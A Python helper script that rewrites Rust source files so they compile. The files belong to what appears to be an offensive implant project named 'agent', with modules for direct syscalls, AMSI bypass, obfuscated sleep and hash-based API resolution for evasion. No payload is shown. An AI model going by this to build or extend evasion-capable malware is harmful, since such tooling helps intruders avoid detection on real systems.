import re

with open("agent/src/syscalls.rs", "r") as f:
    text = f.read()

text = text.replace("use winapi::um::winternl::{TEB, PEB};", "// using raw pointers instead of winternl PEB")
# Since we might need PEB:
text = text.replace("*(gs.add(0x60)) as *mut PEB", "*(gs.add(0x60)) as *mut winapi::um::winternl::PEB")

text = text.replace("if (*import_desc).u.OriginalFirstThunk() != 0 { (*import_desc).u.OriginalFirstThunk() } else { &(*import_desc).FirstThunk }", "if *(*import_desc).u.OriginalFirstThunk() != 0 { *(*import_desc).u.OriginalFirstThunk() } else { (*import_desc).FirstThunk }")
text = text.replace("if (*import_desc).u.OriginalFirstThunk() != 0 { (*import_desc).u.OriginalFirstThunk() } else { (*import_desc).FirstThunk }", "if *(*import_desc).u.OriginalFirstThunk() != 0 { *(*import_desc).u.OriginalFirstThunk() } else { (*import_desc).FirstThunk }")


with open("agent/src/syscalls.rs", "w") as f:
    f.write(text)

with open("agent/src/amsi_defense.rs", "r") as f:
    text = f.read()
text = text.replace("crate::syscalls::syscall!", "crate::syscall!")
with open("agent/src/amsi_defense.rs", "w") as f:
    f.write(text)

with open("agent/src/obfuscated_sleep.rs", "r") as f:
    text = f.read()
text = text.replace("crate::syscalls::syscall!", "crate::syscall!")
with open("agent/src/obfuscated_sleep.rs", "w") as f:
    f.write(text)

with open("agent/src/evasion.rs", "r") as f:
    text = f.read()
text = text.replace("let nt_close = pe_resolve::get_proc_address_by_hash", "let nt_close: *mut winapi::ctypes::c_void = pe_resolve::get_proc_address_by_hash")
text = text.replace("let addr = pe_resolve::get_proc_address_by_hash", "let addr: *mut winapi::ctypes::c_void = pe_resolve::get_proc_address_by_hash")
text = text.replace("let func = pe_resolve::get_proc_address_by_hash", "let func: *mut winapi::ctypes::c_void = pe_resolve::get_proc_address_by_hash")
with open("agent/src/evasion.rs", "w") as f:
    f.write(text)

